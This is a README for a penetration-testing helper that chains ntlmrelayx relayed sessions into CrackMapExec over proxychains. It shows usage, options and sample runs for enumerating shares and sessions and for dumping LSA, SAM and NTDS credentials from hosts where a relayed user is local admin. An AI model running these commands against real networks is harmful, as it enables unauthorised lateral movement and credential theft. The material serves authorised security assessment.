# ntlmrelayx2proxychains

## Introduction
[ntlmrelayx2proxychains](https://github.com/He-No/ntlmrelayx2proxychains) aims to connect the tool of the [SecureAuthCorps'](https://github.com/SecureAuthCorp) [impacket](https://github.com/SecureAuthCorp/impacket) suite, ntlmrelayx.py (hereafter referred to as "ntlmrelayx"), along with @[byt3bl33d3r](https://github.com/byt3bl33d3r)'s tool, [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (hereafter referred to as "CME"), over [proxychains](https://github.com/haad/proxychains), developped by [haad](https://github.com/haad).

Currently, when having active relays via ntlmrelayx.py, you need to manually provide user, domain, and ip address in CME over proxychains. The idea behind this tool is to automate this process. 

So have you ever felt too lazy to **explore all shares, loggedin users, sessions, disks, and/or password policy** manually after using ntlmrelayx **or** felt too lazy to **dump the lsa, sam, and/or ntds** on all systems where you found a local administrator? If so, you'll for sure enjoy [ntlmrelayx2proxychains](https://github.com/He-No/ntlmrelayx2proxychains)! :) 

##  Help!

  This tools' help-page can be consulted via CLI using the `-h` or the `--help`parameter.

    $python3 ntlmrelay2proxychains.py --help
        Usage:
                $python3 ntlmrelay2proxychains.py --action {shares|lsa|sam|...} [--exclude] [--adminonly] [--help]
        
        
        Required argument:
                -a, --action            possible actions {shares|lsa|sam|ntds|sessions|disks|loggedon-users|pass-pol|???}
        
        
        Optional arguments:
                -h, --help              shows this help message and exits
                -e, --exclude           exludes ips listed in the file checked_ips.txt
                -A, --adminonly         only executes the command if the user is local admin on the IP
        
        
        Credits:
                This tool was made by @BugZ_GENK
        
        
        Disclaimer:
                Use with care, on your own risk! (and other legal blabla indicating you are NOT using this tool on my responsibility/accountability :))

## Requirements
This tool requires you to have **proxychains configured, Python3 and CME installed, and ntlmrelayx running using socks mode**.

## Required argument
As can be read above, the `-a` or `--action` parameter is **required**. Using this parameter you specify what comes at the end of your command in CME. 

**Example:**
When using ntlmrelayx2proxychains in the following way 

    $ python3 ntlmrelayx2proxychains -a shares
    
   The following command is executed in the background:

    $ proxychains crackmapexec smb -u "victim" -p "" -d "contoso" 10.10.10.10 --shares

## Optional arguments
### Exclude IPs
Starting of with the explanation of the `--exclude` (or the short version `-e`) parameter.

This parameter expects no further input via CLI, but checks the file `checked_ips.txt` (created on the first run of this tool). In this file you can specify IPs you want `ntlmrelayx2proxychains.py` to skip.

This can be useful when, ***e.g.*** , exploring shares. During your security assessment, you find a share where you have full read/write access. You fully crawl through this share, but can't find anything interesting. At this point, you are given the option to exclude this endpoint so it does not keep showing up over an over again, while you have already thoroughly investigated these shares. 

**Example:**
Example of `checked_ips.txt`:

    $cat checked_ips.txt
    10.10.10.10
    127.0.0.10
    192.168.0.10

The following output will be generated by `ntlmrelayx2proxychains.py`:

     $python3 ntlmrelay2proxychains.py -a shares -e
    ===========> Configuration Overview <===========
    Action set to: shares
    Showing only admins: False
    Actively excluding IPs: True
    -> Excluded IPs: 10.10.10.10, 127.0.0.10, 192.168.0.10
    =========> Hendrik "@BugZ_GENK" Noben <=========
    [SNIP]
Note, `Actively excluding IPs:` is set to `True` and `--> Excluded IPs: [SNIP]` sums up all IPs that are excluded.

### Adminonly
The next built-in parameter ntlmrelayx2proxychains supports is the `--adminonly` parameter (or the short version `-A`).

This parameter expects no further input at all. It just checks the ntlmrelayx API where it found relays for users that are local administrator on that particular endpoint.

This can be useful when, ***e.g.*** , dumping LSA secrets from target systems, as this operation can only be performed by users have local admin rights.

**Example:**
The following output will be generated by `ntlmrelayx2proxychains.py`:

     $python3 ntlmrelay2proxychains.py -a lsa -A
    ===========> Configuration Overview <===========
    Action set to: lsa
    Showing only admins: True
    Actively excluding IPs: False
    =========> Hendrik "@BugZ_GENK" Noben <=========
    [SNIP]

## Example run

   

    $ python3 ntlmrelay2proxychains.py -a shares
    ===========> Configuration Overview <===========
    Action set to: shares
    Showing only admins: False
    Actively excluding IPs: False
    =========> Hendrik "@BugZ_GENK" Noben <=========
    
    [*] Grepping your current relays......
    [*] Beautifying the json file......
    
    [*] Setting domain......
    [OK] Domain is: DUM
    
    [*] Ready, set, GO!
    proxychains crackmapexec smb -u "SRV-0001$" -p "" -d CONTOSO 10.10.10.5 --shares
    ProxyChains-3.1 (http://proxychains.sf.net)
    [SNIP]
    
    proxychains crackmapexec smb -u "VICTIM" -p "" -d CONTOSO 10.10.10.10 --shares
    ProxyChains-3.1 (http://proxychains.sf.net)
    [SNIP]

